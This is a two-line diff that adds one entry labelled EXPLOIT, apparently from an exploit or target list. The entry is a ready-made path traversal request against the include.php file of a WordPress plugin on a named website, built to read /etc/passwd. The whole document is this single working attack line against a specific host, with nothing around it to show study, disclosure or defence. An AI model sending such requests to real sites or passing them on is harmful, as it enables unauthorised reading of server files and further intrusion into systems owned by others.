@@ -1,0 +1,2 @@
+EXPLOIT: http://wellnesscoachs.net//wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd
+
